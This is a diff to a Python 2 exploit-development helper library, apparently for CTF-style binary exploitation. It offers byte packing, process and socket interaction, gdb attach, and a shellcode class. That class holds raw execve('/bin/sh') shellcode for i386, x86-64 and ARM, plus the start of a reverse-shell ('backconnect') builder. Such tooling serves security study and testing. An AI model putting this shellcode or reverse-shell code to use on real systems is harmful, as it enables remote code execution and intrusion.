@@ -1,9 +1,3 @@
-####################################################
-# Small tool for building exploit payload on Linux #
-# 												   #	
-# Author: h4niz 								   #
-####################################################
-
 #-*-coding: utf-8-*_
 import subprocess
 import os
@@ -16,7 +10,7 @@ import sys
 
 # Signal return code
 global sigreturn
-sigreturn = {1: 'Hangup (POSIX)', 2: 'Interrupt (ANSI)', 3: 'Quit (POSIX)', 4: 'Illegal Instruction (ANSI)', 5: 'Trace trap (POSIX)', 6: 'Abort (ANSI)', 7: 'BUS error (4.2 BSD)', 8: 'Floating-Point arithmetic Exception (ANSI). ', 9: 'Kill, unblockable (POSIX)', 10: 'User-defined signal 1', 11: 'Segmentation Violation (ANSI)', 12: 'User-defined signal 2', 13: 'Broken pipe (POSIX)', 14: 'Alarm clock (POSIX)', 15: 'Termination (ANSI)', 16: 'Stack fault', 17: 'Child status has changed (POSIX)', 18: 'Continue (POSIX)', 19: 'Stop, unblockable (POSIX)', 20: 'Keyboard stop (POSIX)', 21: 'Background read from tty (POSIX)', 22: 'Background write to tty (POSIX)', 23: 'Urgent condition on socket (4.2 BSD)', 24: 'CPU limit exceeded (4.2 BSD)', 25: 'File size limit exceeded (4.2 BSD)', 26: 'Virtual Time Alarm (4.2 BSD)', 27: 'Profiling alarm clock (4.2 BSD)', 28: 'Window size change (4.3 BSD, Sun)', 29: 'Pollable event occurred (System V)', 30: 'Power failure restart (System V)', 31: 'Bad system call'}
+sigreturn = {0: 'Good bye!', 1: 'Hangup (POSIX)', 2: 'Interrupt (ANSI)', 3: 'Quit (POSIX)', 4: 'Illegal Instruction (ANSI)', 5: 'Trace trap (POSIX)', 6: 'Abort (ANSI)', 7: 'BUS error (4.2 BSD)', 8: 'Floating-Point arithmetic Exception (ANSI). ', 9: 'Kill, unblockable (POSIX)', 10: 'User-defined signal 1', 11: 'Segmentation Violation (ANSI)', 12: 'User-defined signal 2', 13: 'Broken pipe (POSIX)', 14: 'Alarm clock (POSIX)', 15: 'Termination (ANSI)', 16: 'Stack fault', 17: 'Child status has changed (POSIX)', 18: 'Continue (POSIX)', 19: 'Stop, unblockable (POSIX)', 20: 'Keyboard stop (POSIX)', 21: 'Background read from tty (POSIX)', 22: 'Background write to tty (POSIX)', 23: 'Urgent condition on socket (4.2 BSD)', 24: 'CPU limit exceeded (4.2 BSD)', 25: 'File size limit exceeded (4.2 BSD)', 26: 'Virtual Time Alarm (4.2 BSD)', 27: 'Profiling alarm clock (4.2 BSD)', 28: 'Window size change (4.3 BSD, Sun)', 29: 'Pollable event occurred (System V)', 30: 'Power failure restart (System V)', 31: 'Bad system call'}
 
 # Ascii color
 global bcolors
@@ -31,7 +25,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 # ----------------  END DEFINE -------------
 
-# These functions below were defined for helping to build payload purpose
+# These functions below was define for helping build payload purpose
 # ******** PACKING **********
 # Pack number
 # 	p8: pack 1bytes
@@ -112,21 +106,24 @@ def in2hexstr(ins):
 # ******** END CONVERT **********
 # ***************** CONTEXT ****************
 # This class is used to define architecture, os, endian
-def context(arch='i386', os='linux', endian='little'):
+class context():
 	global __ARCH__, __OS__, __ENDIAN__ 
-
-	__ARCH__ = arch
-	__OS__ = os 
-	__ENDIAN__ = endian
-
-	def os(os):
-		__OS__ = os
-	def arch(arch):
+	__ARCH__ = None
+	__OS__ = None
+	__ENDIAN__ = None
+	
+	def __init__(self, arch='i386', os='linux', endian='little'):
 		__ARCH__ = arch
-	def endian(endian):
-		__ENDIAN__ = endian		
+		__OS__ = os 
+		__ENDIAN__ = endian
 
-	return __ARCH__, __OS__, __ENDIAN__
+	def os(self, pos):
+		__OS__ = pos
+	def arch(self, parch):
+		__ARCH__ = parch
+	def endian(self, pendian):
+		__ENDIAN__ = pendian		
+
 # ----------------  END CONTEXT -----------------
 
 # ***************** PROCESS ****************
@@ -150,8 +147,8 @@ class process():
 
 		try:
 			self.proc = subprocess.Popen(path2file, stdin=self.istdout, stdout=self.ostdin, stderr=self.ostdin)
-
 			print bcolors.OKGREEN + "[->] Run file successful!\n" + bcolors.ENDC
+			
 		except Exception as ex:
 			print bcolors.FAIL + "[SubProcess] Error: {}".format(ex) + bcolors.ENDC
 			exit()
@@ -181,24 +178,39 @@ class process():
 
 
 	#Other methods
-	def pid():
-		return self.proc.pid()
+	def pid(self):
+		return self.proc.pid
 
 	def close(self):
 		return self.proc.kill()
 
 	def interactive(self):
-		self.proc.wait()
+		self.proc.poll()
 		returncode = self.proc.returncode
+		# print "ReturnCode: ", returncode
 		if returncode != None:		
 			print bcolors.FAIL + sigreturn[int(returncode)*-1] + bcolors.ENDC	
 
 		os.dup2(1, self.ostdin.fileno())
 		os.dup2(2, self.ostdin.fileno())
 		while True:
-			print self.recv(0x1000)
-			self.sendline( raw_input("> ") )
+			resp = self.recv(0x1000)
+			if resp: 
+				print resp
+				resp = ""
+			
+			sen = raw_input(bcolors.WARNING + "# " + bcolors.ENDC)
+			if sen != "\n":
+				self.sendline(sen)
+			else:
+				self.sendline("id")
 
+			self.proc.poll()
+			returncode = self.proc.returncode
+			# print "ReturnCode: ", returncode
+			if returncode != None:		
+				print bcolors.FAIL + sigreturn[int(returncode)*-1] + bcolors.ENDC	
+				exit()
 		return None
 # ----------------  END PROCESS -----------------
 
@@ -248,7 +260,7 @@ class remote():
 	def interactive(self):
 		while True:
 			print "[{}]: ".format(self.sock.getsockname()[0]) + self.sock.recv(0x1000)
-			stdinline = raw_input("[Me]: ")
+			stdinline = raw_input(bcolors.WARNING + "# " + bcolors.ENDC)
 			if "ExitInteractive" in stdinline:
 				break;
 				try:
@@ -257,7 +269,8 @@ class remote():
 				except Exception as ex:
 					print "[SOCKET] Error: {}".format(ex)	
 
-			self.sock.send( stdinline )
+			if stdinline != "\n":
+				self.sock.send( stdinline )
 		return None
 # ----------------  END REMOTE -----------------
 
@@ -268,14 +281,22 @@ class shellcode:
 		self.arch = arch
 		self.os = os
 
-	def sh():
+		if __ARCH__:
+			self.arch = __ARCH__
+		if __OS__:
+			self.os = __OS__
+
+		print "========= GLOBAL =========\n __ARCH__: {}\n __OS__: {}".format(__ARCH__, __OS__)
+		print "========= LOCAL =========\n __ARCH__: {}\n __OS__: {}".format(self.arch, self.os)
+		
+	def sh(self):
 		if self.os == 'linux':
 			if self.arch == 'i386': return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 			else: return "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 		elif self.os == 'arm':
 			return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
 
-	def backconnect(host, port):
+	def backconnect(self, host, port):
 		if self.os == 'linux':
 			if self.arch == 'i386':
 				sc = "\x68"
@@ -296,14 +317,14 @@ class shellcode:
 # ***************** GDB ****************
 # This class is used to attach process into gdb to local debug
 class gdb:
-	def __init__(self, procObj, breakpoint):
+	def __init__(self, procObj, breakpoint=None):
 		self.pid = procObj.pid()
 		self.breakpoint = breakpoint
 
 
 	def attach(self):
 		print "[" + bcolors.OKGREEN + "b" + bcolors.ENDC + "] COMMANDS LIST"
-		print "\t\t\t" + self.breakpoint
+		if self.breakpoint: print "\t\t\t" + self.breakpoint
 
 		data = ""
 		if self.breakpoint:
@@ -313,12 +334,13 @@ class gdb:
 
 		try:
 			g = subprocess.Popen(['gnome-terminal', '-x', 'gdb', '--pid', str(self.pid), '-x', '/tmp/h4nizattach.dbg'])
+			g.wait()
+			raw_input()
+			if g.returncode != None:
+				g.kill()	
 		except:
 			pass
 
-		g.wait()
-		if g.returncode != None:
-			g.kill()	
 # ----------------  END GDB -----------------
 
 # ***************** GDB ****************
